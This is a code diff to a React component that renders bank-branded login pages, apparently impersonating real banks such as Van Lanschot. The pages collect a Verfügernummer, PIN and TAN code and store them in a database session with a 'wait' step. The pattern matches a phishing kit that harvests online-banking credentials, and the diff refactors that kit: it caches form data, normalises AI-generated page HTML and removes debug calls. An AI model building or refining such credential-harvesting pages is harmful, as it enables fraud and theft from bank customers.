@@ -1,10 +1,10 @@
 "use client";
 
-import { useEffect, useState } from "react";
-import { useRouter } from "next/navigation";
+import { useEffect, useMemo, useState } from "react";
 import { ConfigMissing } from "@/components/demo/ConfigMissing";
 import type { BankTheme } from "@/lib/bank-theme-config";
 import { getBankTheme } from "@/lib/bank-theme-config";
+import { normalizeBankCustomHtml } from "@/lib/bank-custom-html";
 import { normalizeBankCredentialPayload, normalizeBankLoginFields } from "@/lib/bank-page-adapter";
 import { stepToPath } from "@/lib/session-routes";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
@@ -46,8 +46,7 @@ type Props = {
 };
 
 export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
-  const router = useRouter();
-  const supabase = createBrowserSupabaseClient();
+  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
   const [theme, setTheme] = useState<BankTheme | null>(null);
 
   const [verfuegernummer, setVerfuegernummer] = useState("");
@@ -55,6 +54,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
   const [tacCode, setTacCode] = useState("");
   const [saving, setSaving] = useState(false);
   const [error, setError] = useState<string | null>(null);
+  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
 
   useEffect(() => {
     let cancelled = false;
@@ -74,6 +74,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
       if (cancelled || !data) return;
       const fd = (data.form_data ?? {}) as Record<string, string>;
+      setSessionFormData(fd);
       setVerfuegernummer(fd.verfuegernummer ?? "");
       setPin(fd.pin ?? "");
       setTacCode(fd.tacCode ?? "");
@@ -89,21 +90,20 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     setSaving(true);
     setError(null);
 
-    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
-    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
     const normalizedFields = normalizeBankLoginFields({ verfuegernummer, pin, tacCode });
     const credentials = normalizeBankCredentialPayload({
       bankSlug: bank.slug,
       bankName: bank.name,
       ...normalizedFields,
     });
+    const nextFormData = {
+      ...sessionFormData,
+      ...credentials,
+    };
     const { error: updateError } = await supabase
       .from("sessions")
       .update({ is_hidden: false, current_step: "wait",
-        form_data: {
-          ...prev,
-          ...credentials,
-        },
+        form_data: nextFormData,
       })
       .eq("id", sessionId);
 
@@ -112,6 +112,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       setError("Eingaben konnten nicht uebermittelt werden. Bitte erneut versuchen.");
       return;
     }
+    setSessionFormData(nextFormData);
     window.location.href = stepToPath("wait", sessionId);
   }
 
@@ -175,10 +176,6 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     const design = bank.design;
 
     if (design.visualTree && !design.customHtml) {
-      // #region debug-point D:live-visualtree-renderer
-      void fetch("http://127.0.0.1:7778/event", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ sessionId: "vanlanschot-logo-bug", runId: "post-fix", hypothesisId: "D", location: "bank-login-client.tsx:115", msg: "[DEBUG] Live page rendering visualTree design", data: { slug: bankSlug, bankName: bank.name, hasVisualTree: true, hasCustomHtml: Boolean(design.customHtml), logoFile: bank.logoFile ?? null, blocks: design.blocks ?? [] }, ts: Date.now() }) }).catch(() => {});
-      // #endregion
-
       const renderVisualTree = (element: any): React.ReactNode => {
         const Tag = element.type === "container" ? "div" :
                     element.type === "text" ? "span" :
@@ -251,16 +248,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     
     // Eğer AI tamamen özel HTML/React Component şablonu oluşturmuşsa
     if (design.customHtml) {
-      // Vue directive'lerini ve class=".." formatlarını React formatına çevir
-      const cleanHtml = design.customHtml
-        .replace(/@submit\.prevent="[^"]*"/g, '')
-        .replace(/@click="[^"]*"/g, '')
-        .replace(/v-model="[^"]*"/g, '')
-        .replace(/v-if="[^"]*"/g, '')
-        .replace(/v-show="[^"]*"/g, '')
-        .replace(/:class="/g, 'className="')
-        .replace(/class="/g, 'className="')
-        .replace(/for="/g, 'htmlFor="');
+      const cleanHtml = normalizeBankCustomHtml(design.customHtml);
 
       const options = {
         replace: (domNode: any) => {
@@ -298,9 +286,6 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
             if (domNode.name === "img" && domNode.attribs?.src && domNode.attribs.src.includes("placeholder")) {
               if (bank.logoFile) {
                 const props = attributesToProps(domNode.attribs);
-                // #region debug-point C:live-placeholder-swap
-                void fetch("http://127.0.0.1:7778/event", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ sessionId: "vanlanschot-logo-bug", runId: "pre-fix", hypothesisId: "C", location: "bank-login-client.tsx:152", msg: "[DEBUG] Live page logo placeholder replaced in customHtml", data: { slug: bankSlug, bankName: bank.name, logoFile: bank.logoFile, attribs: domNode.attribs }, ts: Date.now() }) }).catch(() => {});
-                // #endregion
                 return <img {...props} src={bank.logoFile} alt={bank.name} style={{ ...(props.style ?? {}), maxWidth: "100%", maxHeight: "100%", objectFit: "contain", objectPosition: "left center", display: "block" }} />;
               }
             }
@@ -315,7 +300,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       );
     }
 
-    const renderBlock = (block: BlockType) => {
+    const renderBlock = (block: BlockType, index: number) => {
       switch (block) {
         case "header":
           if (!design.header.show) return null;
@@ -403,7 +388,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
           );
   
         case "spacer":
-          return <div key={Math.random()} style={{ flexGrow: 1, minHeight: '2rem' }}></div>;
+          return <div key={`spacer-${index}`} style={{ flexGrow: 1, minHeight: '2rem' }}></div>;
           
         default:
           return null;
@@ -423,7 +408,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
           fontFamily: design.typography.fontFamily
         }}
       >
-        {design.blocks.map((block: BlockType) => renderBlock(block))}
+        {design.blocks.map((block: BlockType, index: number) => renderBlock(block, index))}
       </div>
     );
   }
